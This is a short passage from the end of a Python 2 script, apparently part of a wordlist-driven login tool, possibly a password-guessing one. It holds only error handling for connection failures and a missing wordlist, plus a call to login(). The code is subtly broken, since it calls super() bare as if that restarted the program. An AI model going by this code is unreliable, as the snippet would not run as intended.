                except requests.exceptions.ConnectionError:

                    print '\x1b[1;91m[!] Connection Error'

                    time.sleep(1)

        except IOError:

            print '\x1b[1;91m[!] File not found...'

            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""

            super()

if __name__ == '__main__':

	login()
